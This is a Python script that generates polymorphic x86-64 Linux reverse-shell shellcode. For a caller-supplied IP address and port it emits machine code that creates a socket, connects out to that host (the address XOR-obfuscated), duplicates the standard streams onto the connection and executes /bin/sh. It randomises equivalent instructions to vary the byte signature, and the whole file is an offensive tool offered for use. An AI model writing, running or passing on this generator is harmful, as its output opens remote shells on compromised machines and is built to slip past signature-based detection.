#!/usr/bin/env python3

import random
import re
import sys
from socket import htons

def print_usage():
    print(f"Usage: {sys.argv[0].split('/')[-1]} <IP> <PORT> [<SIZE_LIMIT>]")

def ip_to_opcode(ip_address):
    ip_bytes = list(reversed(ip_address.split(".")))
    ip_hex = "0x" + "".join(["%.2x" % int(byte) for byte in ip_bytes])

    asm_iter = iter("%.2x" % (int(ip_hex, 16) ^ 0xdeadbeef))
    return ' '.join(list(reversed([''.join(pair) for pair in zip(asm_iter, asm_iter)])))

def port_to_opcode(port):
    port_chars = iter("%.2x" % (htons(port)))
    return ' '.join(list(reversed([''.join(pair) for pair in zip(port_chars, port_chars)])))

def syscall_opcode():
    return "0f 05"

def clean_register_opcode(register):
    opcodes = {
        'rax': ["48 31 c0", "4d 31 c0 4c 89 c0"],
        'rbx': ["48 31 db", "4d 31 c0 4c 89 c3"],
        'rcx': ["48 31 c9", "4d 31 c0 4c 89 c1"],
        'rdx': ["48 31 d2", "4d 31 c0 4c 89 c2"],
        'rsi': ["48 31 f6", "4d 31 c0 4c 89 c6"],
        'rdi': ["48 31 ff", "4d 31 c0 4c 89 c7"]
    }
    return random.choice(opcodes.get(register, [""]))

def socket_opcode():
    opcodes = [
        ["b0 29", "b0 28 04 01"],
        ["40 b7 02", "40 b7 01 40 80 c7 01"],
        ["40 b6 01", "40 b6 02 40 80 ee 01"]
    ]
    return ' '.join([random.choice(opcode) for opcode in opcodes]) + ' ' + syscall_opcode()

def connect_opcode(ip, port):
    ip_opcodes = ip_to_opcode(ip)
    port_opcodes = port_to_opcode(port)
    opcodes = [
        "49 89 c7", "4d 31 c0 49 89 c0 4d 89 c7",
        "48 89 c7", "4d 31 c0 49 89 c0 4c 89 c7",
        clean_register_opcode('rax'),
        "b0 2a", "b0 29 04 01", "53",
        f"be {ip_opcodes}", "81 f6 ef be ad de",
        f"66 68 {port_opcodes}", "66 6a 02",
        "48 89 e6", "4d 31 c0 49 89 e0 4c 89 c6",
        "b2 18", "4d 31 c0 41 b0 18 44 88 c2"
    ]
    return ' '.join(random.sample(opcodes, len(opcodes))) + ' ' + syscall_opcode()

def dup2x3_opcode():
    opcodes = [
        clean_register_opcode('rax'), clean_register_opcode('rdx'),
        "b0 21", "b0 20 04 01", "4c 89 ff", "4d 31 c0 4d 89 f8 4c 89 c7",
        clean_register_opcode('rsi'), "b0 21", "b0 20 04 01",
        "4c 89 ff", "4d 31 c0 4d 89 f8 4c 89 c7", clean_register_opcode('rsi'),
        "40 b6 01", "4d 31 c0 41 b0 01 44 88 c6", "b0 21", "b0 20 04 01",
        "4c 89 ff", "4d 31 c0 4d 89 f8 4c 89 c7", clean_register_opcode('rsi'),
        "40 b6 02", "4d 31 c0 41 b0 02 44 88 c6"
    ]
    return ' '.join(random.sample(opcodes, len(opcodes))) + ' ' + syscall_opcode()

def gimme_shell_opcode():
    opcodes = [
        clean_register_opcode('rax'), clean_register_opcode('rdx'),
        "48 bb 2f 2f 62 69 6e 2f 73 68", "4d 31 c0 49 b8 2f 2f 62 69 6e 2f 73 68 4c 89 c3",
        "50", "53", "48 89 e7", "4d 31 c0 49 89 e0 4c 89 c7", "50", "57",
        "48 89 e6", "4d 31 c0 49 89 e0 4c 89 c6", "b0 3b", "b0 3c 2c 01"
    ]
    return ' '.join(random.sample(opcodes, len(opcodes))) + ' ' + syscall_opcode()

def generate_shellcode(ip, port):
    opcodes = ''
    opcodes += clean_register_opcode('rax')
    opcodes += clean_register_opcode('rbx')
    opcodes += clean_register_opcode('rcx')
    opcodes += clean_register_opcode('rdx')
    opcodes += clean_register_opcode('rsi')
    opcodes += clean_register_opcode('rdi')
    opcodes += socket_opcode()
    opcodes += connect_opcode(ip, port)
    opcodes += dup2x3_opcode()
    opcodes += gimme_shell_opcode()

    opcodes = re.findall("[a-f0-9]{2} ", opcodes)
    shellcode = ''.join(["\\x" + opcode.rstrip() for opcode in opcodes])
    return shellcode, len(opcodes)

def main(ip, port, size_limit=None):
    print("[.] Generating shellcode...")
    if size_limit:
        while True:
            shellcode, length = generate_shellcode(ip, port)
            if length <= size_limit:
                break
    else:
        shellcode, length = generate_shellcode(ip, port)
    
    print(f"[+] {length} bytes shellcode generated for {ip}:{port}")
    print(f"\n{shellcode}\n")

if __name__ == "__main__":

    if len(sys.argv[1:]) < 2:
        print("[-] Illegal number of parameters.")
        print_usage()
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])

    if len(re.findall(r"^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$", ip)) != 1:
        print("[-] Given IP is not IPv4.")
        print_usage()
        sys.exit(2)

    if port < 1 or port > 65535:
        print("[-] Port number must be between 1 and 65535")
        print_usage()
        
        sys.exit(3)

    size_limit = int(sys.argv[3]) if len(sys.argv[3:]) == 1 else None

    main(ip, port, size_limit)
